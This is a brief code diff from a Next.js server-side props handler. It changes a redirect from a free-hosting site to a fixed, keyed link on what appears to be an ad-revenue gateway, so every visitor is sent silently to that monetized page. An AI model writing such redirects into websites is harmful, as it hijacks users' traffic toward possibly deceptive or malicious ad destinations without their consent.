@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://nemeechand.000webhostapp.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/wmc01hx0fw?key=f140db9ce2ad38f2ac3499fe42b7bd92/`
 				}`,
 			},
 		};
